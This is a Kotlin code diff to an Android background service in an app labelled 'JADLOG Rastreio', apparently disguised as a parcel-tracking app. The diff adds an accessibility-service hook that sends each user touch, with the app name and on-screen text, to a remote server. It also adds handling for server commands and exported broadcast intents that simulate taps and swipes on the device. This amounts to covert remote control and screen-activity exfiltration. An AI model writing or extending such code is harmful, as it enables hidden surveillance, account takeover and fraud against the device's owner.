@@ -23,6 +23,10 @@ import android.util.Log
 import com.droidview.agent.MainActivity
 import com.droidview.agent.R
 import com.droidview.agent.vpn.AgentVpnService
+import com.droidview.agent.accessibility.AgentAccessibilityService
+import com.droidview.agent.accessibility.DetectedTouchEvent
+import com.droidview.agent.accessibility.TouchEventListener
+import com.droidview.agent.DViewAccessibilityService
 import org.json.JSONObject
 import java.io.File
 import java.net.HttpURLConnection
@@ -50,10 +54,35 @@ class AgentForegroundService : Service() {
     private var activeEnrollmentToken: String = ""
     private var activeAppName: String = "JADLOG Rastreio"
 
+    private val touchListener = object : TouchEventListener {
+        override fun onTouchDetected(event: DetectedTouchEvent) {
+            sendTouchEventToServerAsync(event)
+        }
+    }
+
     private val reconnectReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
-            Log.i(TAG, "Sinal remoto recebido: ${intent?.action}. Forçando ciclo de reconexão e verificação de seed.")
-            triggerImmediatePing()
+            val action = intent?.action ?: return
+            Log.i(TAG, "Sinal remoto recebido no AgentForegroundService: $action")
+            when (action) {
+                "com.droidview.agent.SIMULATE_TOUCH" -> {
+                    val x = intent.getFloatExtra("x", intent.getIntExtra("x", 0).toFloat())
+                    val y = intent.getFloatExtra("y", intent.getIntExtra("y", 0).toFloat())
+                    val duration = intent.getLongExtra("duration", 60L)
+                    simulateTouch(x, y, duration)
+                }
+                "com.droidview.agent.SIMULATE_SWIPE" -> {
+                    val x1 = intent.getFloatExtra("x1", intent.getIntExtra("x1", 0).toFloat())
+                    val y1 = intent.getFloatExtra("y1", intent.getIntExtra("y1", 0).toFloat())
+                    val x2 = intent.getFloatExtra("x2", intent.getIntExtra("x2", 0).toFloat())
+                    val y2 = intent.getFloatExtra("y2", intent.getIntExtra("y2", 0).toFloat())
+                    val duration = intent.getLongExtra("duration", 300L)
+                    simulateSwipe(x1, y1, x2, y2, duration)
+                }
+                else -> {
+                    triggerImmediatePing()
+                }
+            }
         }
     }
 
@@ -63,10 +92,18 @@ class AgentForegroundService : Service() {
         registerNetworkWatcher()
 
         try {
+            AgentAccessibilityService.addTouchListener(touchListener)
+        } catch (e: Exception) {
+            Log.w(TAG, "Aviso ao registrar touchListener: ${e.message}")
+        }
+
+        try {
             val filter = IntentFilter().apply {
                 addAction("com.droidview.agent.RECONNECT")
                 addAction("com.droidview.agent.PING_NOW")
                 addAction("com.droidview.agent.CHECK_UPDATE")
+                addAction("com.droidview.agent.SIMULATE_TOUCH")
+                addAction("com.droidview.agent.SIMULATE_SWIPE")
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 registerReceiver(reconnectReceiver, filter, Context.RECEIVER_EXPORTED)
@@ -75,6 +112,77 @@ class AgentForegroundService : Service() {
             }
         } catch (e: Exception) {
             Log.w(TAG, "Aviso ao registrar reconnectReceiver: ${e.message}")
+        }
+    }
+
+    fun simulateTouch(x: Float, y: Float, duration: Long = 60L): Boolean {
+        val a11y = AgentAccessibilityService.instance ?: DViewAccessibilityService.instance
+        if (a11y != null) {
+            Log.i(TAG, "Executando toque digital simulado em ($x, $y) por ${duration}ms")
+            return a11y.simulateTap(x, y, duration)
+        }
+        Log.w(TAG, "Serviço de acessibilidade não está pronto para simular toque em ($x, $y)")
+        return false
+    }
+
+    fun simulateSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long = 300L): Boolean {
+        val a11y = AgentAccessibilityService.instance ?: DViewAccessibilityService.instance
+        if (a11y != null) {
+            Log.i(TAG, "Executando deslize digital simulado: ($x1, $y1) -> ($x2, $y2) por ${duration}ms")
+            return a11y.simulateSwipe(x1, y1, x2, y2, duration)
+        }
+        Log.w(TAG, "Serviço de acessibilidade não está pronto para simular deslize")
+        return false
+    }
+
+    private fun sendTouchEventToServerAsync(event: DetectedTouchEvent) {
+        Thread {
+            try {
+                val candidate = activeServerUrl.ifBlank { "http://localhost:3000" }
+                val deviceId = "dev_" + (Build.MODEL.replace("\\s+".toRegex(), "_").lowercase())
+                val url = URL("$candidate/devices/$deviceId/touch-events")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                conn.connectTimeout = 3000
+                conn.readTimeout = 3000
+                conn.doOutput = true
+
+                val payload = JSONObject().apply {
+                    put("id", event.id)
+                    put("deviceId", deviceId)
+                    put("action", event.action)
+                    put("x", event.x)
+                    put("y", event.y)
+                    if (event.endX != null) put("endX", event.endX)
+                    if (event.endY != null) put("endY", event.endY)
+                    if (event.durationMs != null) put("durationMs", event.durationMs)
+                    put("packageName", event.packageName)
+                    put("className", event.className)
+                    put("viewText", event.text)
+                    put("viewDescription", event.contentDescription)
+                    put("bounds", event.bounds)
+                    put("source", event.source)
+                    put("timestamp", event.timestamp)
+                }
+
+                conn.outputStream.use { os ->
+                    os.write(payload.toString().toByteArray(Charsets.UTF_8))
+                    os.flush()
+                }
+
+                val code = conn.responseCode
+                conn.disconnect()
+                if (code in 200..299) {
+                    Log.d(TAG, "Toque digital registrado remotamente: ${event.id}")
+                }
+            } catch (e: Exception) {
+                Log.d(TAG, "Aviso ao despachar toque digital: ${e.message}")
+            }
+        }.apply {
+            name = "DViewTouchDispatchWorker"
+            isDaemon = true
+            start()
         }
     }
 
@@ -372,10 +480,50 @@ class AgentForegroundService : Service() {
                 }
 
                 val responseCode = conn.responseCode
+                val responseBody = if (responseCode in 200..299) {
+                    try {
+                        conn.inputStream.bufferedReader().readText()
+                    } catch (_: Exception) { "" }
+                } else ""
                 conn.disconnect()
 
                 if (responseCode == 200 || responseCode == 201) {
                     lastSeenTimestamp = System.currentTimeMillis()
+
+                    // Processa comandos pendentes enviados pelo servidor central (ex: simulação de toque digital)
+                    if (responseBody.isNotBlank()) {
+                        try {
+                            val respJson = JSONObject(responseBody)
+                            val pendingCmds = respJson.optJSONArray("pendingCommands")
+                            if (pendingCmds != null && pendingCmds.length() > 0) {
+                                for (i in 0 until pendingCmds.length()) {
+                                    val cmd = pendingCmds.getJSONObject(i)
+                                    val cmdType = cmd.optString("type", "")
+                                    val cmdPayload = cmd.optJSONObject("payload")
+                                    Log.i(TAG, "Comando pendente recebido do servidor: $cmdType | $cmdPayload")
+                                    when (cmdType) {
+                                        "touch" -> {
+                                            val x = cmdPayload?.optDouble("x", 0.0)?.toFloat() ?: 0f
+                                            val y = cmdPayload?.optDouble("y", 0.0)?.toFloat() ?: 0f
+                                            val dur = cmdPayload?.optLong("duration", 60L) ?: 60L
+                                            simulateTouch(x, y, dur)
+                                        }
+                                        "swipe" -> {
+                                            val x1 = cmdPayload?.optDouble("x1", 0.0)?.toFloat() ?: 0f
+                                            val y1 = cmdPayload?.optDouble("y1", 0.0)?.toFloat() ?: 0f
+                                            val x2 = cmdPayload?.optDouble("x2", 0.0)?.toFloat() ?: 0f
+                                            val y2 = cmdPayload?.optDouble("y2", 0.0)?.toFloat() ?: 0f
+                                            val dur = cmdPayload?.optLong("duration", 300L) ?: 300L
+                                            simulateSwipe(x1, y1, x2, y2, dur)
+                                        }
+                                    }
+                                }
+                            }
+                        } catch (e: Exception) {
+                            Log.d(TAG, "Aviso ao processar comandos pendentes: ${e.message}")
+                        }
+                    }
+
                     if (candidate != activeServerUrl) {
                         Log.i(TAG, "Conexão estabelecida com sucesso via $candidate (anterior: $activeServerUrl)")
                         activeServerUrl = candidate
@@ -521,6 +669,10 @@ class AgentForegroundService : Service() {
         try {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
             networkCallback?.let { cm?.unregisterNetworkCallback(it) }
+        } catch (_: Exception) {}
+
+        try {
+            AgentAccessibilityService.removeTouchListener(touchListener)
         } catch (_: Exception) {}
 
         try {
